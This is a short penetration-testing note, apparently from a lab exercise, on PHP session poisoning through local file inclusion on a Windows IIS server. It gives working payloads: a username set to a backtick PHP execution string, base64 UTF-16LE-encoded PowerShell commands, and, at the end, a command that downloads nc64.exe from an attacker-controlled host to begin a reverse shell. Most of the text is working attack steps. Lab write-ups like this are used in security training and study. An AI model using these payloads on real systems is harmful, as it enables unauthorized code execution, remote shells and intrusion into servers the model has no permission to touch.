
## In Windows

php session cookies of users are getting stored in C:\Windows\Temp\sess_<sess_cookie_id>
If there is anyway that u can enumerate this file and see the content's u can check if it's possible to inject an php file inside the variable stored. For Example it could be that the session cookie get's stored inside ur username variable e.G "saitama".

## Example

We enumerated through LFI that the session cookie got stored inside an username variable.

```
curl http://10.129.229.6/blog/?lang=/Windows/Temp/sess_q4luf3f63it7tjjf1qk6lg52qf
</html>
username|s:7:"saitama";</body>
</html>
```

We see that PHP binded the session cookie to "saitama" which was the user we registered.

## PoC 

This PoC checks if command injection is working. The symbol ` is an alias for PHP's exec, there anything inside it will be executed.

```
<?=`powershell whoami`?>
```

So this is the initial PoC, but in order to be able to execute it, PHP will have to fuze this command into the server. Which is possible by a logical flaw. We can create an user called <?=`powershell whoami`?>. Since this is IIS and there is stronger protection on windows we will have to convert the command first of all using UTF-16LE and then base64 encoded it aswell.

```
echo whoami | iconv -t utf-16le | base64
dwBoAG8AYQBtAGkACgA=
```

The final payload would be:

```
<?=`powershell /enc dwBoAG8AYQBtAGkACgA=`?>
```

## Reverse Shell PoC Netcat

Creating Payload which downloads nc64.exe binary onto target system.

```
echo "wget http://10.10.14.239/nc64.exe -o C:\\Windows\\TEMP\\nc64.exe" | iconv -t UTF-16LE | base64
```